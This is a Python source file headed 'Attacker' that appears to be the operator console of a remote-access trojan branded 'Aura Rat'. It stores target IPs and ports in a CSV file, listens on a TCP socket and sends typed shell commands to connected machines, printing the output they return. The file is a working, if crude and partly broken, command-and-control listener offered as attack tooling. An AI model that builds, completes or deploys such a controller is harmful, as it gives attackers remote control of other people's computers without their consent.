## Attacker
##  Importing
import socket
import csv
from colorama import Fore
from subprocess import call
import pandas
import os
import sys
import time 

# we print the thing
Ascii_Logo = Fore.CYAN + """
==============================================================
    _____                        __________         __       |
   /  _  \  __ ______________    \______   \_____ _/  |_     |
  /  /_\  \|  |  \_  __ \__  \    |       _/\__  \\   __\     |
 /    |    \  |  /|  | \// __ \_  |    |   \ / __ \|  |      |
 \____|__  /____/ |__|  (____  /  |____|_  /(____  /__|      |
         \/                  \/          \/      \/          |
                                                             |
                      Beta Version 0.1                       |
==============================================================     
                                                           """
server_ip = ''
server_port = 1010
Help = Fore.GREEN + "\n[0]" + "add a new user          " + "[1]" + "List All The Saved Users\n" + "[2]" + "Delete a User         " + "  [3]" + "Connect to a user\n" + "[4]" + "File Transfer" 
# we make a fake loading cuz why not
print('Loading...')
print('Tip: Enter "exit" to exit')
time.sleep(3)


print(Ascii_Logo + Help)
cmd = input(Fore.GREEN + "Enter a Number: ")
# if the number is exit then exit
if cmd == "exit":
        sys.exit(0)

# we handle the commands here
#command handling
#create a new user
if cmd == "0":
    user = input(Fore.GREEN + "Enter a username: ")
    ip = input(Fore.GREEN + "Enter an ip: ")
    port = input(Fore.GREEN + "Enter a port: ")
    data = [user, ip, port]
    with open('userlist.csv', "a", encoding='UTF8', newline='' ) as f:
        writer = csv.writer(f)
        writer.writerow([user, ip, port])
    call(["python", "server.py"])        

#read the csv with user
elif cmd == "1":
    df = pandas.read_csv('userlist.csv')
    print(df)
    call(["python", "server.py"])
#delete a user 
elif cmd == "2":
    todelete = input(Fore.GREEN + "Enter a username to delete: ")
    # We open the source file and get its lines
    with open('userlist.csv', 'r') as inp:
        lines = inp.readlines()

    # We open the target file in write-mode
    with open('userlist.csv', 'w') as out:
        for line in lines:
            if not todelete in line:
                out.write(line)
    #then We call the server
    call(["python", "server.py"])
    




def read_csv_file(file_path):
    lines = []
    with open(file_path, 'r', newline='') as csvfile:
        csv_reader = csv.DictReader(csvfile)
        for row in csv_reader:
            lines.append(row)
    return lines

# Example usage:
csv_file_path = 'userlist.csv'
data_lines = read_csv_file(csv_file_path)

def find_ip_and_port(data_lines, server_name):
    for row in data_lines:
        if row['Name'] == server_name:
            return row['IP'], int(row['Port'])
    return None, None
#if we want to connect
if cmd == "3":
    # Ask the user for the server name
    user_server_name = input("Enter the server name: ")

    # Find IP and Port based on the user's input
    ip, port = find_ip_and_port(data_lines, user_server_name)

    if ip and port:
        print(f"Server: {user_server_name}, IP: {ip}, Port: {port}")
        # Store IP and Port in separate variables if needed
        server_ip = ip
        server_port = port
    else:
        print(f"Server '{user_server_name}' not found in the CSV file.")
        call(("python", "server.py"))
        # Connect to the server
        #new tcp ipv4 socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            #we bind to the ip
            s.bind((server_ip, server_port))
            # and listen for connections
            s.listen(20)
            print(f"Listening To Connections as {server_ip}:{server_port}")
            while True:
                conn, addr = s.accept()
                print(Fore.GREEN + f"Succesfully Connected to {addr}")
                with conn:
                    while True:
                        msg = input(Fore.YELLOW + ">>> ")
                        data = conn.sendall(str.encode(msg))
                        if (msg == "exit"):
                            print(Fore.RED + "Leaving...")
                            time.sleep(1)
                            sys.exit(0)
                            break
                        data = conn.recv(4096)
                        print('Output:\n', data.decode())


    
                